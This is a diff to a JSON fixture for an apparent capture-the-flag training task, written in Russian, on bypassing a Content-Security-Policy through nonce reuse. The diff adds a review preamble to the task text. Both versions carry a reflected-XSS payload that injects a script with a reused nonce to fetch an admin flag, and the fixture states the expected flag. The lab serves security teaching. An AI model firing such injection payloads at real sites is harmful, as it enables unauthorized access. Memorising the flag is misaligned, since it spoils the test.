@@ -5,7 +5,7 @@
   "expect": { "file": "/home/student/task/found.txt", "contains": "nto{c5p_n0nc3_r3us3_byp4ss}" },
   "fs": [
     { "path": "/home/student/task", "type": "dir" },
-    { "path": "/home/student/task/task.md", "text": "# Практика: CSP advanced — nonce reuse\n\n`shop.local` ставит строгий CSP с `nonce` и `strict-dynamic`. Но тот же\nnonce переиспользуется в отражённом параметре — инъекция выполнится.\n\n1. Снимаем и раскладываем CSP:\n\n   curl -sI https://shop.local/\n\n2. Nonce утекает в отражение — пробуем инъекцию с этим nonce:\n\n   curl -s 'https://shop.local/search?q=<script nonce=abc123>fetch(\"/admin/flag\")</script>' > found.txt\n\n3. Набери `check`.\n" }
+    { "path": "/home/student/task/task.md", "text": "# Практика: CSP advanced — nonce reuse\n## Повторение (`web-csp-bypass`)\n\nПрежде чем браться за «CSP advanced: nonce reuse, strict-dynamic, base-uri, script gadgets», повтори приём из `web-csp-bypass` — «CSP и его обход». Как читать Content-Security-Policy, где он оставляет дыры и как обходить слабые политики до выполнения JS.\nСначала маленький шаг тем же приёмом:\n\n    head -n 5 task.md\n\nЭто возвращает тебя в контекст предшествующего урока, и уже затем — собственно задача ниже.\n\n\n`shop.local` ставит строгий CSP с `nonce` и `strict-dynamic`. Но тот же\nnonce переиспользуется в отражённом параметре — инъекция выполнится.\n\n1. Снимаем и раскладываем CSP:\n\n   curl -sI https://shop.local/\n\n2. Nonce утекает в отражение — пробуем инъекцию с этим nonce:\n\n   curl -s 'https://shop.local/search?q=<script nonce=abc123>fetch(\"/admin/flag\")</script>' > found.txt\n\n3. Набери `check`.\n" }
   ],
   "tools": {
     "curl": {
